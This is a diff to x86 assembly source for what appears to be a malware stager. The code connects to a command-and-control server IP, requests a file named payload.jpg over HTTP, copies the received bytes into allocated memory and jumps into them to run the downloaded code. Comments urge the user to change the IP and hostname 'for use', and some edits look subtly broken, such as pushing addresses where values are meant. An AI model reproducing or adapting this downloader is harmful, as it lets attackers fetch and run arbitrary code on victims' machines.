@@ -40,12 +40,14 @@ Section .data; initialized data
 				 connectstr 	db "connect",0
 				 sendstr 		db "send",0
 				 recvstr		dd "recv",0
+				 recv_byte_amount	dd 00000000 ; Set This to be the size you're expecting to recv!
+				 Counter		dd 00000000 ; Set this to be the estimated size of your complete payload. Feelfree to go over a bit.
 				 
 				 printformat db "%s",0
 				 
 								
 				 Ipaddrstr 		db "1.2.3.4",0 ; C&C server IP ; CHANGE IP AND HOSTNAME FOR USE!!!
-				 GetString 		db "GET /payload.jpg HTTP/1.1",0x0d,0x0a,"Host: $HOSTNAME",0x0d,0x0a,"Connection: close",0x0d,0x0a,0x0d,0xa,00,00
+				 GetString 		db "GET /payload.jpg HTTP/1.1",0x0d,0x0a,"Host: $HOSTNAME",0x0d,0x0a,"Connection: keep-alive",0x0d,0x0a,0x0d,0xa,00,00
 
 
 
@@ -113,7 +115,7 @@ _main: ; int main (){}
 	
 	
 	@Prepare_For_Start:
-	push 25000		;I know... messed up! needs at least 440 bytes. Weird eh?
+	push recv_byte_amount		;Please specify the bi
 	call _malloc
 	mov [mallocptr], eax
 	
@@ -170,7 +172,7 @@ _main: ; int main (){}
 
 	;recv()006C4140 ; We have the image and response at the proper loacation
 	push 0
-	push 25000 ; Bytes we want to recv
+	push recv_byte_amount ; Bytes we want to recv
 	push dword [mallocptr]
 	nop
 	nop
@@ -185,13 +187,13 @@ _main: ; int main (){}
 	mov dword [recvammount], eax ; save the recv ammount ; We will need to move this to another tap in memory
 
 	
-	push 25000
+	push recv_byte_amount
 	call _malloc
 	mov dword [jmallocptr] , eax 
 	
 	mov esi, dword [recvammount]
 	mov edi, dword [jmallocptr]
-	mov ecx,2500 ; set the counter.
+	mov ecx, Counter ; set the counter.
 	
 	@mov_bytes_to_jmallocptr:
 	;MOVS BYTE ES:[EDI], PTR DS:[ESI]
@@ -208,7 +210,7 @@ _main: ; int main (){}
 	mov eax , [jmallocptr]
 	jmp eax
 	
-  ; Code executation never actually makes it hear due to the payload.
+  ; Code executation never actually makes it hear due to the payload. NO CLEAN UPS , but it proves a point. ))))
   
 	@Exit:
 
